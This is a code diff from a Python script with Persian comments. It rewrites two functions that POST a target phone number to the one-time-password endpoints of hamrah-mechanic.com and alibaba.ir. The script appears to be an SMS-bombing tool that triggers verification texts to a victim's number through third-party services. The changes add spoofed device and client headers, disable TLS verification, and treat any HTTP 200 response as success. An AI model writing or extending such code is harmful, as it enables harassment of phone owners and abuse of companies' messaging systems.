@@ -64,36 +64,76 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
-def alibaba(phone):
-    try:
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
-        alibabaD = {"phoneNumber": formatted_phone}
-
-        r = requests.post(
-            url='https://ws.alibaba.ir/api/v3/account/mobile/otp',
-            json=alibabaD,
-            timeout=5
-        )
-        print(r.status_code, r.text)  # برای debug
-        return r.json().get("result", {}).get("success", False)
-    except Exception as e:
-        print(f'{r}[!] AliBaba Exception: {e}{a}')
-        return False
-
-
 def mek(phone):
     try:
+        # فرمت شماره
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         formatted_phone = f"0{formatted_phone}"
-        meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
-        meD = {"phoneNumber": formatted_phone}
 
-        r = requests.post(url=meU, data=meD, timeout=5)
-        print(r.status_code, r.text)  # برای debug
-        return r.json().get('isSuccess', False)
-    except Exception as e: 
+        # URL و payload
+        url = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
+        payload = {
+            "PhoneNumber": formatted_phone,
+            "prevDomainUrl": None,
+            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
+            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
+            "prevUrl": "https://www.hamrah-mechanic.com/profile/",
+            "referrer": None
+        }
+
+        # هدرها
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "env": "prd",
+            "Source": "ios",
+            "X-Meta-Token": "413341",
+            "_uti": str(uuid.uuid4())
+        }
+
+        # درخواست POST
+        r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
+        print(r.status_code, r.text)  # debug
+        if r.status_code == 200:
+            return True
+        else:
+            return False
+
+    except Exception as e:
         print(f'{r}[!] HamrahMechanic Exception: {e}{a}')
+        return False
+
+def alibaba(phone):
+    try:
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+
+        # URL و payload
+        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
+        payload = {
+            "phoneNumber": formatted_phone
+        }
+
+        # هدرها
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "ab-channel": "WEB-NEW",
+            "tracing-sessionid": "ab-alohomora",
+            "tracing-device": "mobile, Mobile Safari, 18.6, iPhone, Apple, iOS, 18.6"
+        }
+
+        # ارسال POST
+        r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
+        print(r.status_code, r.text)  # debug
+        if r.status_code == 200:
+            return True
+        else:
+            return False
+
+    except Exception as e:
+        print(f'{r}[!] AliBaba Exception: {e}{a}')
         return False
 
 
